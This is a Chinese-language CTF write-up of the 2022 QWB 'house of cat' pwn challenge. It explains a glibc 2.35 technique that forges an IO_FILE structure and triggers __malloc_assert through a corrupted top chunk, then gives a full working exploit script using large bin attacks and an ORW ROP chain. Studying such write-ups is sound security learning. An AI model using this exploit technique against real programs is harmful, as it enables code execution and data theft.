---
title: house of cat -2022强网杯pwn复现
tags:
  - house of cat
  - 伪造IO_FILE
  - orw
  - large bin attack
  - malloc_assert
categories:
  - 学习总结
  - 赛题WP
abbrlink: 7de5a5b7
---

前几天进行了 `house of apple` 的学习，而 `house of appl2` 和 `house of cat` 利用的大致思想是一样的（都是通过 `wide_data->wide_vtable` 中的函数指针进行的跳转），因此来复现一下去年强网杯的这道 `house of cat`

本题我感觉也比较有代表性，因为在 `house of apple` 的那篇文章中的例题最后触发攻击是在 `exit` 函数，但是如果题目中无法从 `main` 函数返回也没有 `exit` 函数，那就需要通过 `malloc_assert` 来触发最后的攻击，而本题就是通过这样的方式触发的攻击。

### 如何通过 `malloc_assert` 触发攻击

`__malloc_assert` 函数会在内存分配处理之前检查请求是否合法，如果检测到不合法的请求就会触发断言并终止程序，触发这个 `__malloc_assert` 函数有很多处，**通常我们选择将 `top chunk` 的 `size`  改成非法（在 `sysmalloc` 函数中有针对这里的检查），这样再次申请堆块的时候就会触发 `__malloc_assert`**

`__malloc_assert` 在 `2.35` 的 `glibc` 中源码如下

```c
static void
__malloc_assert (const char *assertion, const char *file, unsigned int line,
		 const char *function)
{
  (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
		     __progname, __progname[0] ? ": " : "",
		     file, line,
		     function ? function : "", function ? ": " : "",
		     assertion);
  fflush (stderr);
  abort ();
}
```

这里有这样一条执行链 `__malloc_assert-> __fxprintf->__vfxprintf->locked_vfxprintf->__vfprintf_internal->_IO_file_xsputn`

最后触发的 `_IO_file_xsputn` 是通过 `vtable` 中的函数指针来触发的，我们想要去劫持的话，首先将 `_IO_2_1_stderr` 结构体中的 `vtable` 改成 `_IO_wfile_jumps+0x10` 的地址（加 `0x10` 的原因是 `_IO_file_xsputn` 的地址在 `_IO_file_jumps` 中比 `IO_file_seekoff` 的地址低 `0x10` 个字节），这样原本跳转执行 `_IO_file_xsputn` 时，实际上执行的是 `_IO_wfile_seekoff` 如下图

![image-20230204093820778](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302040938184.png)



`_IO_wfile_seekoff` 函数源码如下

```c
_IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode)
{
  off64_t result;
  off64_t delta, new_offset;
  long int count;

  if (mode == 0)
    return do_ftell_wide (fp);
......

  bool was_writing = ((fp->_wide_data->_IO_write_ptr
		       > fp->_wide_data->_IO_write_base)
		      || _IO_in_put_mode (fp));

  if (was_writing && _IO_switch_to_wget_mode (fp))
    return WEOF;
......
}
```

我们执行 `_IO_wfile_seekoff` 函数的目的就是为了触发 `_IO_switch_to_wget_mode` 函数

`_IO_switch_to_wget_mode` 函数源码如下

```c
_IO_switch_to_wget_mode (FILE *fp)
{
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)
      return EOF;
......
}
```

执行 `_IO_switch_to_wget_mode` 函数的目的就是为了触发 `_IO_WOVERFLOW` ,因为这个 `_IO_WOVERFLOW` 函数是通过 `_wide_data->_wide_vtable` 中所存放的函数指针进行跳转的， `_wide_vtable` 是我们可控的，从而在这里可以劫持程序的执行流。

想触发最后的 `_IO_WOVERFLOW` ，需要满足 `fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base` 这个条件。



之所以先提上面的部分是因为本题接下来用的手法只有上面部分是 `house of apple2`  中没有提到的，其余部分都和 `house of apple2` 中的利用思路相似，就不再详细说明。



### house of cat

附件：

链接: https://pan.baidu.com/s/1BSiI9TmmU7uqMr7Ou3bIxQ?pwd=ccp4 提取码: ccp4 

#### 保护策略

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041006987.png" alt="image-20230204100619768" style="zoom: 67%;" />

保护拉满，沙箱是白名单只能打 `orw` ，需要注意一下 `read` 的第一个参数只能设置为 `0` ，所以最后打 `orw` 之前需要先 `close(0)`



#### 程序逻辑

程序是一个菜单的堆题，不过在使用程序的主要功能之前，需要输入一些数据来绕过这个检查，可能自己的逆向能力还得提高吧，反正这里的检查我是搞了好久，结论就是最开始输入 `LOGIN | r00t QWB QWXFadmin` 去进行登录，接下来每一次调用具体功能之前都要发送一句 `CAT | r00t QWB QWXF$\xff` ,接下来才能去执行正常的功能。



功能一共有四个 `add` `edit` `show` `delete` 

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041015973.png" alt="image-20230204101548907" style="zoom:50%;" />

`edit` 函数只能使用两次，并且只能写入 `0x30` 字节的数据

`delete` 函数存在 `UAF` 漏洞

`add` 函数申请的堆块大小的范围是 `0x418~0x46f` ，申请完堆块后可以向里面写入 `size` 字节的数据

`show` 函数只能泄露 `0x30` 字节的数据



#### 利用思路

1. 泄露 `libc` 地址和堆地址
2. 利用 `edit` 函数完成第一次 `large bin attack` 向 `libc` 中的全局变量 `stderr` 写入一个堆地址，从而控制 `_IO_2_1_stderr` 结构体的各个字段
3. 第二次 `large bin attack` 去篡改 `top chunk` 的 `size` 将其改为非法（要往小了改，因为只有 `top chunk` 无法满足要申请的 `size ` 时，才会触发 `sysmalloc`） **注意 `large bin attack` 想将 `top chunk` 的 `size` 改小的话，需要地址错位**
4. 申请一个堆块，此时执行 `__malloc_assert` 触发攻击



思路不难，难点在于整体的一个堆风水和结构体布局需要慢慢调试，因为文章开头已经说明了如何通过 `__malloc_assert` 触发攻击，剩下的就是先劫持 `_IO_2_1_stderr` 结构体，将其的 `vtable` 字段改为 `_IO_wfile_jumps+0x10`  地址，然后 `_wide_data->vtable` 改为可控堆地址，使其执行 `_IO_WOVERFLOW` 的时候，可以进行劫持执行流（这里只说明了**部分篡改**的字段）

然后依然是 [house of apple2](https://zikh26.github.io/posts/19609dd.html) 这篇文章的例题中提到的用 `magic_gadget` 进行一个栈迁移（如果需要看具体的细节请参考 `house of apple` 这篇文章），然后彻底控制程序的执行流，去打 `rop` 链，执行 `close` `open` `read` `write` 函数



最后我出示一下伪造的两个结构体

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041045993.png" alt="image-20230204104522759" style="zoom:50%;" />





<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041048906.png" alt="image-20230204104823695" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041048822.png" alt="image-20230204104835594" style="zoom:50%;" />



#### EXP

[tools源码](https://zikh26.github.io/posts/ad411136.html)

```py
from tools import *
context.log_level='debug'
context.arch='amd64'

p,e,libc=load('a')
payload='LOGIN | r00t QWB QWXFadmin'

p.sendafter("mew mew mew~~~~~~\n",payload)

def add(index,size,content):
    p.sendafter("mew mew mew~~~~~~\n",'CAT | r00t QWB QWXF$\xff')
    p.sendlineafter("plz input your cat choice:\n",str(1))
    p.sendlineafter("plz input your cat idx:\n",str(index))
    p.sendlineafter("plz input your cat size:\n",str(size))
    p.sendlineafter("plz input your content:\n",content)

def show(index):
    p.sendafter("mew mew mew~~~~~~\n",'CAT | r00t QWB QWXF$\xff')
    p.sendlineafter("plz input your cat choice:\n",str(3))
    p.sendlineafter("plz input your cat idx:\n",str(index))

def delete(index):
    p.sendafter("mew mew mew~~~~~~\n",'CAT | r00t QWB QWXF$\xff')
    p.sendlineafter("plz input your cat choice:\n",str(2))
    p.sendlineafter("plz input your cat idx:\n",str(index))

def edit(index,content):
    p.sendafter("mew mew mew~~~~~~\n",'CAT | r00t QWB QWXF$\xff')
    p.sendlineafter("plz input your cat choice:\n",str(4))
    p.sendlineafter("plz input your cat idx:\n",str(index))
    p.sendlineafter("plz input your content:\n",content)

add(0xe,0x450,'a')
add(0xd,0x450,'a')
delete(0xe)
add(0xc,0x460,'a')
show(0xe)
p.recvuntil('Context:\n')
p.recv(8)
libc_base=recv_libc()-0x21a0e0
p.recv(2)
heap_base=u64(p.recv(6).ljust(8,b'\x00'))-0x290
log_addr('libc_base')
log_addr('heap_base')

IO_list_all=libc_base+libc.symbols['_IO_list_all']
magic_gadget=libc_base+0x16a1fa
"""
<svcudp_reply+26>:    mov    rbp,QWORD PTR [rdi+0x48]
<svcudp_reply+30>:    mov    rax,QWORD PTR [rbp+0x18]
<svcudp_reply+34>:    lea    r13,[rbp+0x10]
<svcudp_reply+38>:    mov    DWORD PTR [rbp+0x10],0x0
<svcudp_reply+45>:    mov    rdi,r13
<svcudp_reply+48>:    call   QWORD PTR [rax+0x28]
"""
leave_ret=libc_base+0x00000000000562ec
add_rsp_ret=libc_base+0x000000000003a889
stderr_ptr=0x21a860+libc_base
lock=libc_base+0x21ba60
pop_rdi=libc_base+0x000000000002a3e5
pop_rsi=libc_base+0x000000000002be51
pop_rdx_r12=libc_base+0x000000000011f497
pop_rax_ret=libc_base+0x0000000000045eb0
syscall=libc_base+0xea5b9
read_addr=libc_base+libc.symbols['read']
write_addr=libc_base+libc.symbols['write']
close_addr=libc_base+libc.symbols['close']

add(0xb,0x450,'a')

#close
rop=p64(pop_rdi)
rop+=p64(0)
rop+=p64(close_addr)
#open
rop+=p64(pop_rdi)
rop+=p64(heap_base+0x1168)# 'flag' address
rop+=p64(pop_rsi)
rop+=p64(0)
rop+=p64(pop_rax_ret)
rop+=p64(2)
rop+=p64(syscall)

#read
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rsi)
rop+=p64(heap_base+0xb40)# flag store address
rop+=p64(pop_rdx_r12)
rop+=p64(0x50)
rop+=p64(0)
rop+=p64(read_addr)

#write
rop+=p64(pop_rdi)
rop+=p64(1)
rop+=p64(pop_rsi)
rop+=p64(heap_base+0xb40)# flag store address
rop+=p64(pop_rdx_r12)
rop+=p64(0x50)
rop+=p64(0)
rop+=p64(write_addr)

wide_data=p64(0)*4+p64(1)
wide_data+=p64(0)*20
wide_data+=b"flag\x00\x00\x00\x00"
wide_data+=p64(0)
wide_data+=p64(0)
wide_data+=p64(heap_base+0x1170)#wide_vtable
wide_data+=p64(magic_gadget)#first call
wide_data+=p64(0)*4
wide_data+=p64(0xdeadbeef)
wide_data+=p64(add_rsp_ret)
wide_data+=p64(0xdeadbeef)
wide_data+=p64(0x1178+0x30+heap_base)#second call
wide_data+=p64(leave_ret)
wide_data+=rop


io_file=p64(0)*7
io_file+=p64(heap_base+0x1180+0x30)#  rbp   io_save_base
io_file+=p64(0)*7
io_file+=p64(lock)+p64(0)*2
io_file+=p64(heap_base+0x10a0)#wide_data
io_file+=p64(0)*6
io_file+=p64(libc_base+0x2160c0+0x10)#vtable
io_file+=wide_data

add(0,0x428,io_file)#0xwfile 2160c0
add(0xf,0x460,'prevent merge chunk')
add(1,0x418,'a')
delete(0)
add(2,0x460,'a')
edit(0,p64(libc_base+0x21a0d0)*2+p64(IO_list_all)+p64(stderr_ptr-0x20))
delete(1)
add(3,0x440,'large bin attack chunk')

add(4,0x418,'a')


#second large bin attack
add(7,0x460,'a')
add(8,0x430,'a')

delete(3)
add(9,0x460,'a')

edit(3,p64(heap_base+0x2e20)+p64(0x21a0e0+libc_base)+p64(heap_base+0x2e20)+p64(0x3265-2+heap_base-0x20))
  
delete(8)

delete(0xe)
debug(p,'pie',0x1F04,0x1F10,0x1EF8,0x1EEC,0x177F) 
add(0xa,0x450,'a')
add(6,0x46f,'a')
p.sendafter("mew mew mew~~~~~~\n",'CAT | r00t QWB QWXF$\xff')
p.sendlineafter("plz input your cat choice:\n",str(1))
p.sendlineafter("plz input your cat idx:\n",str(6))
p.sendlineafter("plz input your cat size:\n",str(0x46f))
p.interactive()

```

![image-20230204105543745](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041055201.png)



### 参考文章

[(44条消息) house of cat 学习_Nqoinaen的博客-CSDN博客](https://blog.csdn.net/m0_51251108/article/details/127290280)